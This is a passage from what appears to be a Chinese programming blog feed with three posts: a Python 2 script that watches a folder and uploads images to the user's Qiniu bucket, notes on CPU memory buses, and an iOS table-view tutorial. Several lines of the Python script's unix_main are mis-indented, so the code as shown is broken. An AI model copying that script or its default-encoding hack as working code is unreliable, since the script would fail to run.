class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> os, time, sys, ConfigParser, platform, urllib, qiniu, pyperclip, signal, threading</div><div class="line"><span class="keyword">from</span> mimetypes <span class="keyword">import</span> MimeTypes</div><div class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> expanduser</div><div class="line"><span class="keyword">from</span> watchdog.observers <span class="keyword">import</span> Observer</div><div class="line"><span class="keyword">from</span> watchdog.events <span class="keyword">import</span> PatternMatchingEventHandler</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># 使用watchdog 监控文件夹中的图像</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyHandler</span><span class="params">(PatternMatchingEventHandler)</span>:</span></div><div class="line">    patterns = [<span class="string">"*.jpeg"</span>, <span class="string">"*.jpg"</span>, <span class="string">"*.png"</span>, <span class="string">"*.bmp"</span>, <span class="string">"*.gif"</span>,<span class="string">"*.tiff"</span>]</div><div class="line">    ignore_directories = <span class="keyword">True</span></div><div class="line">    case_sensitive = <span class="keyword">False</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process</span><span class="params">(self, event)</span>:</span></div><div class="line">        <span class="keyword">if</span> event.event_type == <span class="string">'created'</span><span class="keyword">or</span> event.event_type == <span class="string">'modified'</span>: <span class="comment">#如果是新增文件或修改的文件</span></div><div class="line">            myThread(event.src_path, <span class="number">1</span>).start() <span class="comment"># 开启线程</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">on_modified</span><span class="params">(self, event)</span>:</span></div><div class="line">        self.process(event)</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">on_created</span><span class="params">(self, event)</span>:</span></div><div class="line">        self.process(event)</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># 使用多线程上传</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">myThread</span><span class="params">(threading.Thread)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, filePath, mode)</span>:</span> <span class="comment">#filePath 文件路径 和 上传模式</span></div><div class="line">        threading.Thread.__init__(self)</div><div class="line">        self.filePath = filePath</div><div class="line">        self.mode = mode</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></div><div class="line">        threadLock.acquire()</div><div class="line">        job(self.filePath, self.mode)</div><div class="line">        threadLock.release()</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># 上传图像、复制到粘贴板、写到文件</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">job</span><span class="params">(file, mode)</span>:</span></div><div class="line">    <span class="keyword">if</span> mode == <span class="number">1</span>:</div><div class="line">        url = upload_with_full_Path(file)</div><div class="line">    <span class="keyword">if</span> mode == <span class="number">2</span>:</div><div class="line">        url = upload_with_full_Path_cmd(file)</div><div class="line">    pyperclip.copy(url)</div><div class="line">    pyperclip.paste()</div><div class="line">    <span class="keyword">print</span> url</div><div class="line">    <span class="keyword">with</span> open(<span class="string">'MARKDOWN_FORMAT_URLS.txt'</span>, <span class="string">'a'</span>) <span class="keyword">as</span> f:</div><div class="line">        image = <span class="string">'!['</span> + url + <span class="string">']'</span> + <span class="string">'('</span> + url + <span class="string">')'</span> + <span class="string">'\n'</span></div><div class="line">        f.write(image + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line"><span class="comment">#-----------------配置--------------------</span></div><div class="line">homedir = expanduser(<span class="string">"~"</span>)  <span class="comment"># 获取用户主目录</span></div><div class="line">config = ConfigParser.RawConfigParser()</div><div class="line">config.read(homedir + <span class="string">'/qiniu.cfg'</span>)  <span class="comment"># 读取配置文件</span></div><div class="line">mime = MimeTypes()</div><div class="line">threadLock = threading.Lock()</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># 优雅退出</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit_gracefully</span><span class="params">(signum, frame)</span>:</span></div><div class="line">    signal.signal(signal.SIGINT, original_sigint)</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="keyword">if</span> raw_input(<span class="string">"\nReally quit? (y/n)&gt; "</span>).lower().startswith(<span class="string">'y'</span>):</div><div class="line">            sys.exit(<span class="number">1</span>)</div><div class="line">    <span class="keyword">except</span> KeyboardInterrupt:</div><div class="line">        print(<span class="string">"Ok ok, quitting"</span>)</div><div class="line">        sys.exit(<span class="number">1</span>)</div><div class="line">    signal.signal(signal.SIGINT, exit_gracefully)</div><div class="line"></div><div class="line">original_sigint = signal.getsignal(signal.SIGINT)</div><div class="line">signal.signal(signal.SIGINT, exit_gracefully)</div><div class="line"></div><div class="line"><span class="keyword">try</span>:</div><div class="line">    bucket = config.get(<span class="string">'config'</span>, <span class="string">'bucket'</span>)  <span class="comment"># 设置  bucket</span></div><div class="line">    accessKey = config.get(<span class="string">'config'</span>, <span class="string">'accessKey'</span>)  <span class="comment"># 设置  accessKey</span></div><div class="line">    secretKey = config.get(<span class="string">'config'</span>, <span class="string">'secretKey'</span>)  <span class="comment"># 设置  secretKey</span></div><div class="line">    path_to_watch = config.get(<span class="string">'config'</span>, <span class="string">'path_to_watch'</span>)  <span class="comment"># 设置   监控文件夹</span></div><div class="line">    enable = config.get(<span class="string">'custom_url'</span>, <span class="string">'enable'</span>)  <span class="comment"># 设置自定义使能 custom_url</span></div><div class="line">    <span class="keyword">if</span> enable == <span class="string">'false'</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">'custom_url not set'</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        addr = config.get(<span class="string">'custom_url'</span>, <span class="string">'addr'</span>)</div><div class="line"><span class="keyword">except</span> ConfigParser.NoSectionError, err:</div><div class="line">    <span class="keyword">print</span> <span class="string">'Error Config File:'</span>, err</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># 设置编码</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">setCodeingByOS</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">if</span> <span class="string">'cygwin'</span> <span class="keyword">in</span> platform.system().lower():</div><div class="line">        <span class="keyword">return</span> <span class="string">'GBK'</span></div><div class="line">    <span class="keyword">elif</span> os.name == <span class="string">'nt'</span> <span class="keyword">or</span> platform.system() == <span class="string">'Windows'</span>:</div><div class="line">        <span class="keyword">return</span> <span class="string">'GBK'</span></div><div class="line">    <span class="keyword">elif</span> os.name == <span class="string">'mac'</span> <span class="keyword">or</span> platform.system() == <span class="string">'Darwin'</span>:</div><div class="line">        <span class="keyword">return</span> <span class="string">'utf-8'</span></div><div class="line">    <span class="keyword">elif</span> os.name == <span class="string">'posix'</span> <span class="keyword">or</span> platform.system() == <span class="string">'Linux'</span>:</div><div class="line">        <span class="keyword">return</span> <span class="string">'utf-8'</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># 处理七牛返回结果</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">parseRet</span><span class="params">(retData, respInfo)</span>:</span></div><div class="line">    <span class="keyword">if</span> retData != <span class="keyword">None</span>:</div><div class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> retData.items():</div><div class="line">            <span class="keyword">if</span> k[:<span class="number">2</span>] == <span class="string">"x:"</span>:</div><div class="line">                print(k + <span class="string">":"</span> + v)</div><div class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> retData.items():</div><div class="line">            <span class="keyword">if</span> k[:<span class="number">2</span>] == <span class="string">"x:"</span> <span class="keyword">or</span> k == <span class="string">"hash"</span> <span class="keyword">or</span> k == <span class="string">"key"</span>:</div><div class="line">                <span class="keyword">continue</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                print(k + <span class="string">":"</span> + str(v))</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        print(<span class="string">"Upload file failed!"</span>)</div><div class="line"></div><div class="line"><span class="comment"># 上传文件方式 1</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_without_key</span><span class="params">(bucket, filePath, uploadname)</span>:</span></div><div class="line">    auth = qiniu.Auth(accessKey, secretKey)</div><div class="line">    upToken = auth.upload_token(bucket, key=<span class="keyword">None</span>)</div><div class="line">    key = uploadname</div><div class="line">    retData, respInfo = qiniu.put_file(upToken, key, filePath, mime_type=mime.guess_type(filePath)[<span class="number">0</span>])</div><div class="line">    parseRet(retData, respInfo)</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># 上传文件方式 2</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_with_full_Path</span><span class="params">(filePath)</span>:</span></div><div class="line">    <span class="keyword">if</span> platform.system() == <span class="string">'Windows'</span>:</div><div class="line">        fileName = <span class="string">"/"</span>.join(<span class="string">""</span>.join(filePath.rsplit(path_to_watch))[<span class="number">1</span>:].split(<span class="string">"\\"</span>))</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        fileName = <span class="string">""</span>.join(filePath.rsplit(path_to_watch))[<span class="number">1</span>:]</div><div class="line">    upload_without_key(bucket, filePath, fileName.decode(setCodeingByOS()))</div><div class="line">    <span class="keyword">if</span> enable == <span class="string">'true'</span>:</div><div class="line">        <span class="keyword">return</span> <span class="string">'!['</span>+fileName+<span class="string">']('</span>+addr + urllib.quote(fileName.decode(setCodeingByOS()).encode(<span class="string">'utf-8'</span>))+<span class="string">')'</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> <span class="string">'http://'</span> + bucket + <span class="string">'.qiniudn.com/'</span> + urllib.quote(fileName.decode(setCodeingByOS()).encode(<span class="string">'utf-8'</span>))</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># 上传文件方式 3</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_with_full_Path_cmd</span><span class="params">(filePath)</span>:</span></div><div class="line">    <span class="keyword">if</span> platform.system() == <span class="string">'Windows'</span>:</div><div class="line">        fileName = os.path.basename(<span class="string">"/"</span>.join((filePath.split(<span class="string">"\\"</span>))))</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">       fileName = os.path.basename(filePath)</div><div class="line">    upload_without_key(bucket, filePath, fileName.decode(setCodeingByOS()))</div><div class="line">    <span class="keyword">if</span> enable == <span class="string">'true'</span>:</div><div class="line">        <span class="keyword">return</span> addr + urllib.quote(fileName.decode(setCodeingByOS()).encode(<span class="string">'utf-8'</span>))</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> <span class="string">'http://'</span> + bucket + <span class="string">'.qiniudn.com/'</span> + urllib.quote(fileName.decode(setCodeingByOS()).encode(<span class="string">'utf-8'</span>))</div><div class="line"></div><div class="line"><span class="comment">#-----------------window platform---------------start</span></div><div class="line"><span class="comment"># window下的监控文件夹变动方式-获取所有文件路径</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_filepaths</span><span class="params">(directory)</span>:</span></div><div class="line">    file_paths = []  <span class="comment"># List which will store all of the full filepaths.</span></div><div class="line">    <span class="keyword">for</span> root, directories, files <span class="keyword">in</span> os.walk(directory):</div><div class="line">        <span class="keyword">for</span> filename <span class="keyword">in</span> files:</div><div class="line">            <span class="comment"># Join the two strings in order to form the full filepath.</span></div><div class="line">            filepath = os.path.join(root, filename)</div><div class="line">            file_paths.append(filepath)  <span class="comment"># Add it to the list.</span></div><div class="line">    <span class="keyword">return</span> file_paths  <span class="comment"># Self-explanatory.</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_clipboard</span><span class="params">(url_list)</span>:</span></div><div class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> url_list:</div><div class="line">        pyperclip.copy(url)</div><div class="line">        spam = pyperclip.paste()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_filename</span><span class="params">(url)</span>:</span></div><div class="line">    <span class="keyword">return</span> url.split(<span class="string">"/"</span>)[<span class="number">-1</span>:][<span class="number">0</span>].split(<span class="string">'.'</span>)[<span class="number">0</span>]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">window_main</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</div><div class="line">        url_list = []</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> sys.argv[<span class="number">1</span>:]:</div><div class="line">            url_list.append(upload_with_full_Path_cmd(i))</div><div class="line">        <span class="keyword">with</span> open(<span class="string">'MARKDOWN_FORMAT_URLS.txt'</span>, <span class="string">'a'</span>) <span class="keyword">as</span> f:</div><div class="line">            <span class="keyword">for</span> url <span class="keyword">in</span> url_list:</div><div class="line">                image = <span class="string">'!['</span> + url + <span class="string">']'</span> + <span class="string">'('</span> + url + <span class="string">')'</span> + <span class="string">'\n'</span></div><div class="line">                <span class="keyword">print</span> url, <span class="string">'\n'</span></div><div class="line">                f.write(image)</div><div class="line">        <span class="keyword">print</span> <span class="string">"\nNOTE: THE MARKDOWN FORMAT URLS ALREADY SAVED IN MARKDOWN_FORMAT_URLS.txt FILE"</span></div><div class="line">        set_clipboard(url_list)</div><div class="line">        sys.exit(<span class="number">-1</span>)</div><div class="line">    <span class="keyword">print</span> <span class="string">"running ... ... \nPress Ctr+C to Stop"</span></div><div class="line">    before = get_filepaths(path_to_watch)</div><div class="line">    <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">        time.sleep(<span class="number">1</span>)</div><div class="line">        after = get_filepaths(path_to_watch)</div><div class="line">        added = [f <span class="keyword">for</span> f <span class="keyword">in</span> after <span class="keyword">if</span> <span class="keyword">not</span> f <span class="keyword">in</span> before]</div><div class="line">        removed = [f <span class="keyword">for</span> f <span class="keyword">in</span> before <span class="keyword">if</span> <span class="keyword">not</span> f <span class="keyword">in</span> after]</div><div class="line">        <span class="keyword">if</span> added:</div><div class="line">            url_list = []</div><div class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> added:</div><div class="line">                url_list.append(upload_with_full_Path(i))</div><div class="line">            <span class="keyword">with</span> open(<span class="string">'MARKDOWN_FORMAT_URLS.txt'</span>, <span class="string">'a'</span>) <span class="keyword">as</span> f:</div><div class="line">                <span class="keyword">for</span> url <span class="keyword">in</span> url_list:</div><div class="line">                    image = <span class="string">'!['</span> + url + <span class="string">']'</span> + <span class="string">'('</span> + url + <span class="string">')'</span> + <span class="string">'\n'</span></div><div class="line">                    <span class="keyword">print</span> url, <span class="string">'\n'</span></div><div class="line">                    f.write(image)</div><div class="line">            <span class="keyword">print</span> <span class="string">"\nNOTE: THE MARKDOWN FORMAT URLS ALREADY SAVED IN MARKDOWN_FORMAT_URLS.txt FILE"</span></div><div class="line">            set_clipboard(url_list)</div><div class="line">        <span class="keyword">if</span> removed:</div><div class="line">            <span class="keyword">pass</span></div><div class="line">        before = after</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">unix_main</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</div><div class="line">        url_list = []</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> sys.argv[<span class="number">1</span>:]:</div><div class="line">            url_list.append(upload_with_full_Path_cmd(i))</div><div class="line">            fileFullName = os.path.basename(<span class="string">"/"</span>.join((i.split(<span class="string">"\\"</span>))))</div><div class="line">            fileName = os.path.splitext(fileFullName)[<span class="number">0</span>]</div><div class="line">            myThread(i, <span class="number">2</span>).start()</div><div class="line">        <span class="keyword">with</span> open(<span class="string">'MARKDOWN_FORMAT_URLS.txt'</span>, <span class="string">'a'</span>) <span class="keyword">as</span> f:</div><div class="line">            <span class="keyword">for</span> url <span class="keyword">in</span> url_list:</div><div class="line">                image = <span class="string">'!['</span>+fileName+<span class="string">']'</span> + <span class="string">'('</span> + url + <span class="string">')'</span> + <span class="string">'\n'</span></div><div class="line">                <span class="keyword">print</span> <span class="string">'Url:'</span>+image, <span class="string">'\nFileName:'</span>+fileFullName</div><div class="line">                f.write(image)</div><div class="line">  set_clipboard(url_list)</div><div class="line">        sys.exit(<span class="number">-1</span>)</div><div class="line">    <span class="keyword">print</span> <span class="string">"running ... ... \nPress Ctr+C to Stop"</span></div><div class="line">    observer = Observer()</div><div class="line">    observer.schedule(MyHandler(), path=path_to_watch <span class="keyword">if</span> path_to_watch <span class="keyword">else</span> <span class="string">'.'</span>, recursive=<span class="keyword">True</span>)</div><div class="line">    observer.start()</div><div class="line">    before = get_filepaths(path_to_watch)</div><div class="line">    <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">        time.sleep(<span class="number">1</span>)</div><div class="line">        after = get_filepaths(path_to_watch)</div><div class="line">        added = [f <span class="keyword">for</span> f <span class="keyword">in</span> after <span class="keyword">if</span> <span class="keyword">not</span> f <span class="keyword">in</span> before]</div><div class="line">        removed = [f <span class="keyword">for</span> f <span class="keyword">in</span> before <span class="keyword">if</span> <span class="keyword">not</span> f <span class="keyword">in</span> after]</div><div class="line">        <span class="keyword">if</span> added:</div><div class="line">            url_list = []</div><div class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> added:</div><div class="line">                url_list.append(upload_with_full_Path(i))</div><div class="line">              fileFullName = os.path.basename(<span class="string">"/"</span>.join((i.split(<span class="string">"\\"</span>))))</div><div class="line">                fileName = os.path.splitext(fileFullName)[<span class="number">0</span>]</div><div class="line">      <span class="keyword">with</span> open(<span class="string">'MARKDOWN_FORMAT_URLS.txt'</span>, <span class="string">'a'</span>) <span class="keyword">as</span> f:</div><div class="line">                <span class="keyword">for</span> url <span class="keyword">in</span> url_list:</div><div class="line">                    image = <span class="string">'!['</span> + url + <span class="string">']'</span> + <span class="string">'('</span> + url + <span class="string">')'</span> + <span class="string">'\n'</span></div><div class="line">                    <span class="keyword">print</span> url, <span class="string">'\n'</span></div><div class="line">                    f.write(image)</div><div class="line">            <span class="keyword">print</span> <span class="string">"\nNOTE: THE MARKDOWN FORMAT URLS ALREADY SAVED IN MARKDOWN_FORMAT_URLS.txt FILE"</span></div><div class="line">            set_clipboard(url_list)</div><div class="line">        <span class="keyword">if</span> removed:</div><div class="line">            <span class="keyword">pass</span></div><div class="line">        before = after</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">            time.sleep(<span class="number">0.1</span>)</div><div class="line">    <span class="keyword">except</span> KeyboardInterrupt:</div><div class="line">        observer.stop()</div><div class="line">        observer.join()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">if</span> os.name == <span class="string">'nt'</span> <span class="keyword">or</span> platform.system() == <span class="string">'Windows'</span>:</div><div class="line">        window_main()  <span class="comment">#window 下执行</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        unix_main()   <span class="comment">#mac 下执行</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>
<h2 id="修改python2的默认编码"><a href="#修改python2的默认编码" class="headerlink" title="修改python2的默认编码"></a>修改python2的默认编码</h2><p>python2的默认编码是ascii,当程序中出现非ascii编码时，python的处理常常会报这样的错:</p>
<p>UnicodeDecodeError: ‘ascii’ codec can’t decode byte 0x?? in position 1: ordinal not in range(128)</p>
<p>python没办法处理非ascii编码的，此时需要自己设置将python的默认编码，一般设置为utf8的编码格式。</p>
<p>解决方案：在路径<code>/Library/Python/2.7/site-packages</code>下新建一个sitecustomize.py，内容为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># encoding=utf8  </span></div><div class="line"><span class="keyword">import</span> sys  </div><div class="line">  </div><div class="line">reload(sys)  </div><div class="line">sys.setdefaultencoding(<span class="string">'utf8'</span>)</div></pre></td></tr></table></figure>
<p>这个时候重启python解释器，执行sys.getdefaultencoding()，会发现此时的默认编码已经转换成utf-8了，多次重启之后，效果相同，这是因为系统在python启动的时候，自行调用该文件，设置系统的默认编码，而不需要每次都手动的加上解决代码，属于一劳永逸的解决方法。</p>
]]></content>
      
        <categories>
            
            <category> 输出markdown格式的图片链接 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CPU对于内存的读写]]></title>
      <url>/2017/06/14/CPU%E5%AF%B9%E4%BA%8E%E5%86%85%E5%AD%98%E7%9A%84%E8%AF%BB%E5%86%99/</url>
      <content type="html"><![CDATA[<p>CPU对于内存读写<br><a id="more"></a></p>
<h1 id="CPU对于内存的读写"><a href="#CPU对于内存的读写" class="headerlink" title="CPU对于内存的读写"></a>CPU对于内存的读写</h1><p>CPU想从内存中读取数据，首先要指定内存的地址，如果是要进行数据的读写，必须要和外部器件（芯片）进行下面三种操作：</p>
<ul>
<li>存储单元的地址</li>
<li>器件的选择，读或写的命令</li>
<li>读或写的数据</li>
</ul>
<p>在计算机中专门连接CPU和其他芯片的导线，通称为总线，从物理上来讲，就是一根根导线的总和，在逻辑上来讲，可以分为三类，分别对应上面的三种操作：</p>
<ul>
<li>地址总线</li>
<li>控制总线</li>
<li>数据总线</li>
</ul>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E4%B8%8B%E8%BD%BD.png" alt="下载.png" title="" class="">
                <p>下载.png</p>
            </figure>
<p>上图中表示的就是CPU从3号单元中读取数据的过程：</p>
<p>1.CPU通过地址总线将地址信息3发出</p>
<p>2.CPU通过控制线发出读命令，选中存储器芯片，并通知他，将要读数据。</p>
<p>3.存储器将3号单元中的数据8通过数据总线传入CPU</p>
<p>同理可以得到写数据的操作过程，从上面知道了CPU如何进行数据的读写，要让一个计算机或者微处理器工作，应向他输入能够驱动它工作的电平信息（机器码）。</p>
<p>e.g-&gt;传送3号单元的内容到寄存器AX：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">MOV AX,[3]</div></pre></td></tr></table></figure>
<hr>
<h2 id="地址总线"><a href="#地址总线" class="headerlink" title="地址总线"></a>地址总线</h2><p>地址总线可以传递多少个不同的信息，CPU就可以对多少个存储单元进行寻址，如果说一个CPU有N个地址线，则可以说这个CPU的地址总线的宽度为N。这样的CPU最多可以寻找2的N次方个内存单元。</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%9C%B0%E5%9D%80%E6%80%BB%E7%BA%BF.png" alt="地址总线.png" title="" class="">
                <p>地址总线.png</p>
            </figure>
<h2 id="数据总线"><a href="#数据总线" class="headerlink" title="数据总线"></a>数据总线</h2><p>CPU与内存或其他器件之间进行数据传送是通过数据总线来进行的。数据总线的宽度决定了CPU和外界的数据传送速度。八根数据总线一次可以传输一个八位的二进制数据（一个字节），依此类推。</p>
<p>8088CPU的数据总线宽度为8，8086 的数据总线宽度为16，假设它们分别向内存写入数据89D8H（H表示16进制，是Hex的缩写）的时候：</p>
<p>下图是8088CPU数据总线上的数据传输情况，如果是8086CPU则是一次传输完。</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E6%95%B0%E6%8D%AE%E6%80%BB%E7%BA%BF.jpeg" alt="数据总线.jpeg" title="" class="">
                <p>数据总线.jpeg</p>
            </figure>
<h2 id="控制总线"><a href="#控制总线" class="headerlink" title="控制总线"></a>控制总线</h2><p>CPU对于外部器件的控制是通过控制总线来实现的。控制总线是一些不同总线的集合。由多少根控制总线，就意味着CPU提供了对外器件的多少种控制，控制总线的宽度决定了CPU对外的控制能力。</p>
<p>内存的读或写命令是由几根控制线综合发出的，其中有一根称为<code>读信号输出</code>的控制线负责由CPU向外传输读信号，CPU向该输出线输出低电平表示要读取数据；有一根称作<code>写信号输出</code>负责传送写信号。</p>
<hr>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>1.汇编指令是机器指令的助记符，同机器指令一一对应</p>
<p>2.每一种CPU都有自己的汇编指令集</p>
<p>3.CPU可以直接使用的信息在内存里存放</p>
<p>4.在存储器中数据和指令没有任何区别，都是二进制信息。</p>
<p>5.存储单元从零开始编号</p>
<p>6.一个存储单元可以存储8个bit,即八位二进制数</p>
<p>7.每一个CPU芯片都有很多管脚，这些管脚和总线相连，也可以说，这些管脚引出总线。一个CPU可以引出三种总线的宽度决定了这个CPU的不同方面的性能。</p>
<ul>
<li>地址总线的宽度决定了CPU的寻址能力</li>
<li>数据总线的宽度决定了CPU一次传输量的大小 ，决定了CPU的速度</li>
<li>控制总线的宽度决定了CPU对其他器件的控制能力</li>
</ul>
<p>参考文本：王爽的汇编语言（第二版）</p>
]]></content>
      
        <categories>
            
            <category> CPU 内存读写 总线 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 程序员的自我修养 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[iOS-UI学习(六)]]></title>
      <url>/2017/06/11/iOS-UI%E5%AD%A6%E4%B9%A0-%E5%85%AD/</url>
      <content type="html"><![CDATA[<p>iOS-UI学习(六)<br><a id="more"></a></p>
<h1 id="UI基础Day7"><a href="#UI基础Day7" class="headerlink" title="UI基础Day7"></a>UI基础Day7</h1><h2 id="1-Demo优化"><a href="#1-Demo优化" class="headerlink" title="1.Demo优化"></a>1.Demo优化</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line">// 使用alertController新版的方式</div><div class="line">- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath &#123;</div><div class="line">    // 弹出alertController</div><div class="line">    UIAlertController *controller = [UIAlertController alertControllerWithTitle:@&quot;编辑&quot; message:nil preferredStyle:UIAlertControllerStyleAlert];</div><div class="line">    </div><div class="line">    // 添加action-动作(按钮)</div><div class="line">    UIAlertAction *cancelAction = [UIAlertAction actionWithTitle:@&quot;取消&quot; style:UIAlertActionStyleCancel handler:nil];</div><div class="line">    </div><div class="line">    // 添加到 alerController</div><div class="line">    [controller addAction:cancelAction];</div><div class="line">    </div><div class="line">    // 添加确定按钮</div><div class="line">    UIAlertAction *sureAction = [UIAlertAction actionWithTitle:@&quot;确定&quot; style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) &#123;</div><div class="line">        </div><div class="line">        // 1. 取出新的英雄名字</div><div class="line">        // 1.1 取出alertController中 textField</div><div class="line">        UITextField *textField = [controller textFields][0];</div><div class="line">        </div><div class="line">        NSString *newName = textField.text;</div><div class="line">        </div><div class="line">        // 2. 修改模型中的数据</div><div class="line">        HeroModel *heroModel = self.dataArray[indexPath.row];</div><div class="line">        heroModel.name = newName;</div><div class="line">        </div><div class="line">        // 3. 刷新数据源</div><div class="line">//        [_tableView reloadData];</div><div class="line">        [_tableView reloadRowsAtIndexPaths:@[indexPath] withRowAnimation:UITableViewRowAnimationLeft];</div><div class="line">        </div><div class="line">    &#125;];</div><div class="line">    </div><div class="line">    // 取出点击cell对应的模型</div><div class="line">    HeroModel *heroModel = self.dataArray[indexPath.row];</div><div class="line">    </div><div class="line">    // 添加输入框</div><div class="line">    [controller addTextFieldWithConfigurationHandler:^(UITextField * _Nonnull textField) &#123;</div><div class="line">        </div><div class="line">        // 给textField 设置文本</div><div class="line">        textField.text = heroModel.name;</div><div class="line">    &#125;];</div><div class="line">    </div><div class="line">    // 添加确定按钮到 alertController</div><div class="line">    [controller addAction:sureAction];</div><div class="line">    </div><div class="line">    [self presentViewController:controller animated:YES completion:nil];</div><div class="line">   </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="2-通过xib自定义cell"><a href="#2-通过xib自定义cell" class="headerlink" title="2.通过xib自定义cell"></a>2.通过xib自定义cell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">//使用这个方法返回的是自定义的子cell</div><div class="line">cellForRowAtIndexPath</div><div class="line">//加载自定义的xib</div><div class="line">cell = [[[NSBundle mainBundle]loadNibNamed:@&quot;GrouponsCell&quot; owner:nil options:nil] lastObject];</div></pre></td></tr></table></figure>
<p>注意⚠️：在通过xib自定义cell的时候一定要设置xib的重用标识符</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-06-05%20%E4%B8%8B%E5%8D%885.52.40.png" alt="屏幕快照 2017-06-05 下午5.52.40.png" title="" class="">
                <p>屏幕快照 2017-06-05 下午5.52.40.png</p>
            </figure>
